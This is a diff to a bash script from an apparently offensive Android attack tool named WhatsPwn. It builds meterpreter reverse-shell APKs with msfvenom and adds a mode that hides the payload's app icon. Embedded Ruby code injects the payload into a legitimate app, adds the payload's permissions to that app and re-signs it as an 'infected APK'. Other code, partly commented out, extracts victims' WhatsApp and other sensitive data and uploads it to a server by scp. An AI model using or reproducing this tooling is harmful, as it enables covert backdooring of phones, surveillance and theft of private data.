@@ -141,11 +141,13 @@ UPLOAD() {
 	if [[ ! -d ${PATHEXT}extracted ]]; then
 		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
 			echo -e "${RED}THERE ARE NO EXTRACTED FILES OR FOLDERS${NONE}"
+			echo -e -n "\nPress any key to continue ..." && read -n 1
 		else
 			echo -e "${BOLD}ONLY BACKUP COMPRESSED FILE FOUND${NONE}"
 			CMND
 			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
 			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
+			echo -e -n "\nPress any key to continue ..." && read -n 1
 		fi
 	else
 		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
@@ -161,7 +163,7 @@ UPLOAD() {
 		fi
 	fi
 	if [[ $USEINTERFACE == "Y" ]]; then
-			ATTACKS_INTERFACE
+			MAIN_INTERFACE
 		else
 			exit 0
 	fi
@@ -198,7 +200,6 @@ fi
 if [[ -z $PAYLOAD ]]; then
 	echo -e "               ${NONE}NO PAYLOAD WAS SPECIFIED IN CONFIG FILE, HOWEVER ...${NONE}"
 	if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
-		echo -e "${RED}COULD NOT FIND ANY PAYLOAD${NONE}"
 		echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${NONE}${BOLD}]: ${NONE}"
 		read CREATE_PAYLOAD
 		case "$CREATE_PAYLOAD" in
@@ -211,11 +212,11 @@ if [[ -z $PAYLOAD ]]; then
 		esac
 	else
 		NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
-		echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
+		echo -e "\n${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
 		echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
 		select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
 			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
-			echo -e "\n\n${BOLD}PLEASE WAIT ...${NONE}"
+			echo -e "${BOLD}PLEASE WAIT ...${NONE}"
 			break
 		done
 	fi
@@ -223,11 +224,11 @@ fi
 
 injected_apk=$(basename "$LEGITIMATE_APK" .apk)
 injected_apk="${injected_apk}_bd.apk"
+
 # MODIFIED CODE FROM SkullTech
-/usr/bin/env ruby - <<EORUBY
+/usr/bin/env ruby -W0 - <<EORUBY
 require 'nokogiri'
 require 'fileutils'
-# Find the activity thatapk_backdoor.rb  is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
@@ -249,10 +250,6 @@ def findlauncheractivity(amanifest)
         end
     end
 end
-
-# If XML parsing of the manifest fails, recursively search
-# the smali code for the onCreate() hook and let the user
-# pick the injection point
 def scrapeFilesForLauncherActivity()
 	smali_files||=[]
 	Dir.glob('${WDIR}/bin/Payloads/Legitimate/smali*/**/*.smali') do |file|
@@ -287,7 +284,6 @@ def scrapeFilesForLauncherActivity()
 end
 def fix_manifest()
 	payload_permissions=[]
-	#Load payload's permissions
 	File.open("${WDIR}/bin/Payloads/Payload/AndroidManifest.xml","r"){|file|
 		k=File.read(file)
 		payload_manifest=Nokogiri::XML(k)
@@ -296,11 +292,9 @@ def fix_manifest()
 			name=permission.attribute("name")
 			payload_permissions << name.to_s
 		end
-	#	print "#{k}"
 	}
 	original_permissions=[]
 	apk_mani=''
-	#Load Legitimate apk's permissions
 	File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
@@ -310,9 +304,7 @@ def fix_manifest()
 			name=permission.attribute("name")
 			original_permissions << name.to_s
 		end
-	#	print "#{k}"
 	}
-	#Get permissions that are not in Legitimate APK
 	add_permissions=[]
 	for permission in payload_permissions
 		if !(original_permissions.include? permission)
@@ -321,7 +313,6 @@ def fix_manifest()
 	end
 	inject=0
 	new_mani=""
-	#Inject permissions in Legitimate APK's manifest
 	for line in apk_mani.split("\n")
 		if (line.include? "uses-permission" and inject==0)
 			for permission in add_permissions
@@ -337,7 +328,6 @@ def fix_manifest()
 end
 apkfile="$LEGITIMATE_APK"
 unless(apkfile && File.readable?(apkfile))
-	puts "THE FILE WAS NOT FOUND OR WAS NOT READABLE\n"
 	exit(1)
 end
 `apktool d -f ${LEGITIMATE_APK} -o ${WDIR}/bin/Payloads/Legitimate`
@@ -355,7 +345,6 @@ rescue Errno::ENOENT
 		smalifile=results[0]
 		activitysmali=results[1]
 	rescue
-		puts "[-] ERROR FINDING LAUNCHER ACTIVITY. EXITING ..."
 		exit(1)
 	end
 end
@@ -368,34 +357,67 @@ File.open(smalifile, "w") {|file| file.puts hookedsmali }
 fix_manifest()
 `apktool b -f ${WDIR}/bin/Payloads/Legitimate -o ${WDIR}/bin/Payloads/${injected_apk}`
 `java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/${injected_apk} $WDIR/bin/Payloads/Signed/${injected_apk}`
-outdir = "${WDIR}/bin/Payloads/Signed/${injected_apk}"
-puts "[+] Infected file ready as [#{outdir}].\n"
 EORUBY
+if [[ -f $WDIR/bin/Payloads/Signed/$injected_apk  ]]; then
+	echo -e "${BOLD}DONE! HERE IS THE INFECTED APK: [${CYAN}$WDIR/bin/Payloads/Signed/$injected_apk${NONE}${NONE}${BOLD}]${NONE}"
+	echo -e -n "\nPress any key to continue ..." && read -n 1
+	PAYLOAD_INT
+else
+	echo -e "${RED}ERROR. CANNOT INJECT CODE.${NONE}"
+	echo -e -n "\nPress any key to continue ..." && read -n 1
+fi
 }
 
 #HIDDEN
-
-
-# VISIBLE
-VISIBLE() {
+HIDDEN() {
 	if [[ -z $PAYLOAD_IP ]]; then
-		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO ${CYAN}${SERV}${NONE}${BOLD}: ${NONE}"
 		read PAYLOAD_IP
 	fi
 	if [[ -z $PAYLOAD_PORT ]]; then
-		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT ${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}: ${NONE}"
 		read PAYLOAD_PORT
 	fi
 	if [[ -z $PAYLOAD_NAME ]]; then
-		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- ${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}: ${NONE}"
 		read PAYLOAD_NAME
 	fi
 	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
 	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
-	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
+	apktool d ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk -o ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME} > /dev/null
+	mv ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/AndroidManifest.xml ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml
+	grep -v '<category android:name="android.intent.category.LAUNCHER">' ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/AndroidManifest.xml
+	rm ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml
+	apktool b -f ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME} -o ${WDIR}/bin/Payloads/unsigned_hidden_${PAYLOAD_NAME}.apk > /dev/null
+	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_hidden_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/hidden_${PAYLOAD_NAME}.apk
 	PAYLOAD="${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk"
 	echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
-	echo -e "[${PAYLOAD}]"
+	echo -e "${BOLD}DONE! HERE IS THE HIDDEN PAYLOAD: [${CYAN}${PAYLOAD}${NONE}${NONE}${BOLD}]${NONE}"
+	echo -e -n "\nPress any key to continue ..." && read -n 1
+	PAYLOAD_INT
+}
+
+# VISIBLE
+VISIBLE() {
+	if [[ -z $PAYLOAD_IP ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO ${CYAN}${SERV}${NONE}${BOLD}: ${NONE}"
+		read PAYLOAD_IP
+	fi
+	if [[ -z $PAYLOAD_PORT ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT ${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}: ${NONE}"
+		read PAYLOAD_PORT
+	fi
+	if [[ -z $PAYLOAD_NAME ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- ${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}: ${NONE}"
+		read PAYLOAD_NAME
+	fi
+	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
+	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_visible_${PAYLOAD_NAME}.apk
+	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_visible_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/visible_${PAYLOAD_NAME}.apk
+	PAYLOAD="${WDIR}/bin/Payloads/Signed/visible_${PAYLOAD_NAME}.apk"
+	echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
+	echo -e "${BOLD}DONE! HERE IS THE VISIBLE PAYLOAD: [${CYAN}${PAYLOAD}${NONE}${NONE}${BOLD}]${NONE}"
+	echo -e -n "\nPress any key to continue ..." && read -n 1
 	PAYLOAD_INT
 }
 
@@ -507,9 +529,9 @@ PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
 IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
 ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
 EOF
-					cat ${WDIR}/.LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1;;
+					cat ${WDIR}/.LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1 ;;
 				# FULL LICENSE C OPTION [CONDITIONS]
-				C|c) cat ${WDIR}/LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1;;
+				C|c) cat ${WDIR}/LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1 ;;
 				esac
 		fi
 	done
@@ -679,89 +701,90 @@ mkdir -p ${WDIR}/tmp/
 #######################################################################################################################
 #                                                  ARGUMENT PARSER                                                    #
 #######################################################################################################################
-if [[ $# > 0 ]]; then
-	option="$1"
-	case "$option" in
-		# FULL ATTACK
-		--full|-f|1) if [[ $# > 1 ]]; then
-						shift
-						while [[ $# > 0 ]]; do
-							option="$1"
-							case "$option" in
-								# SUBOPTIONS FOR FULL ATTACK
-								-p|--payload) PAYLOAD="Y" && shift ;;
-								-e|--extraction) BLACKHOLE="Y" && shift ;;
-								-v|--victim) NAME="$2" && shift 2 ;;
-								-d|--dcim) DCIM="Y" && shift ;;
-								-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
-								-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
-								-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
-								-o|--output) PATH="$2" && shift 2 ;;
-								*) cat ${WDIR}/bin/USAGE && break ;;
-							esac
-						done
-					fi && WHATSPWNREMOTE ;;
-		# RELAUNCH PAYLOAD
-		--relaunch-payload|-r|2) BD2 && cd ${HOME} ;;
-		# LAUNCH REMOTE SHELL IF POSSIBLE, IF NOT LAUNCH LOCAL SHELL
-		--shell|-s|3) SHELL && cd ${HOME} ;;
-		# RESTORE WHATSAPP IN CASE OF ERROR
-		--restore|-w|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
-		# EXTRACT SENSITIVE DATA ONLY [NOT WHATSAPP DATABASE]
-		--extraction|-x|5) if [[ $2 == "local" ]]; then # EXTRACTION SUBOPTIONS
-									# LOCAL EXTRACTION
-									if [[ $# > 2 ]]; then
-										shift 2
-										while [[ $# > 0 ]]; do
-											option="$1"
-											case "$option" in
-												-v|--victim) NAME="$2" && shift 2 ;;
-												-d|--dcim) DCIM="Y" && shift ;;
-												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
-												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
-												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
-												-o|--output) PATH="$2" && shift 2 ;;
-												*) cat ${WDIR}/bin/USAGE && break ;;
-											esac
-										done
-										BHL
-									else
-										BHL
-									fi
-								 fi
-								 # REMOTE EXTRACTION
-								 if [[ $2 == "remote" ]]; then
-								 	if [[ $# > 2 ]]; then
-										shift 2
-										while [[ $# > 0 ]]; do
-											option="$1"
-											case "$option" in
-												-v|--victim) NAME="$2" && shift ;;
-												-d|--dcim) DCIM="Y" && shift ;;
-												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
-												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
-												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
-												-o|--output) PATH="$2" && shift ;;
-												*) cat ${WDIR}/bin/USAGE && break ;;
-											esac
-										done
-										BHRMANUAL
-									else
-										BHRMANUAL
-									fi
-								 fi && cat ${WDIR}/bin/USAGE ;;
-		# UPLOAD EXTRACTED FILES TO SERVER
-		--upload|-u|6) UPLOAD ;;
-		# LAUNCH CLI INTERFACE
-		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE ;;
-		-v|--version) echo "WhatsPwn 2.0" && exit ;;
-		# ANY OTHER OPTION
-		*) cat ${WDIR}/bin/USAGE ;;
-	esac
-else
-	# IF NO OPTIONS GIVEN
-	cat ${WDIR}/bin/USAGE
-fi
+#if [[ $# > 0 ]]; then
+#	option="$1"
+#	case "$option" in
+#		# FULL ATTACK
+#		--full|-f|1) if [[ $# > 1 ]]; then
+#						shift
+#						while [[ $# > 0 ]]; do
+#							option="$1"
+#							case "$option" in
+#								# SUBOPTIONS FOR FULL ATTACK
+#								-p|--payload) PAYLOAD="Y" && shift ;;
+#								-e|--extraction) BLACKHOLE="Y" && shift ;;
+#								-v|--victim) NAME="$2" && shift 2 ;;
+#								-d|--dcim) DCIM="Y" && shift ;;
+#								-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
+#								-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+#								-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
+#								-o|--output) PATH="$2" && shift 2 ;;
+#								*) cat ${WDIR}/bin/USAGE && break ;;
+#							esac
+#						done
+#					fi && WHATSPWNREMOTE ;;
+#		# RELAUNCH PAYLOAD
+#		--relaunch-payload|-r|2) BD2 && cd ${HOME} ;;
+#		# LAUNCH REMOTE SHELL IF POSSIBLE, IF NOT LAUNCH LOCAL SHELL
+#		--shell|-s|3) SHELL && cd ${HOME} ;;
+#		# RESTORE WHATSAPP IN CASE OF ERROR
+#		--restore|-w|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
+#		# EXTRACT SENSITIVE DATA ONLY [NOT WHATSAPP DATABASE]
+#		--extraction|-x|5) if [[ $2 == "local" ]]; then # EXTRACTION SUBOPTIONS
+#									# LOCAL EXTRACTION
+#									if [[ $# > 2 ]]; then
+#										shift 2
+#										while [[ $# > 0 ]]; do
+#											option="$1"
+#											case "$option" in
+#												-v|--victim) NAME="$2" && shift 2 ;;
+#												-d|--dcim) DCIM="Y" && shift ;;
+#												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
+#												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+#												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
+#												-o|--output) PATH="$2" && shift 2 ;;
+#												*) cat ${WDIR}/bin/USAGE && break ;;
+#											esac
+#										done
+#										BHL
+#									else
+#										BHL
+#									fi
+#								 fi
+#								 # REMOTE EXTRACTION
+#								 if [[ $2 == "remote" ]]; then
+#								 	if [[ $# > 2 ]]; then
+#										shift 2
+#										while [[ $# > 0 ]]; do
+#											option="$1"
+#											case "$option" in
+#												-v|--victim) NAME="$2" && shift ;;
+#												-d|--dcim) DCIM="Y" && shift ;;
+#												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
+#												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+#												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
+#												-o|--output) PATH="$2" && shift ;;
+#												*) cat ${WDIR}/bin/USAGE && break ;;
+#											esac
+#										done
+#										BHRMANUAL
+#									else
+#										BHRMANUAL
+#									fi
+#								 fi && cat ${WDIR}/bin/USAGE ;;
+#		# UPLOAD EXTRACTED FILES TO SERVER
+#		--upload|-u|6) UPLOAD ;;
+#		# LAUNCH CLI INTERFACE
+#		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE ;;
+#		-v|--version) echo "WhatsPwn 2.0" && exit ;;
+#		# ANY OTHER OPTION
+#		*) cat ${WDIR}/bin/USAGE ;;
+#	esac
+#else
+#	# IF NO OPTIONS GIVEN
+#	cat ${WDIR}/bin/USAGE
+#fi
+MAIN_INTERFACE
 # EXIT WITHOUT ERRORS
 exit 0
 #######################################################################################################################
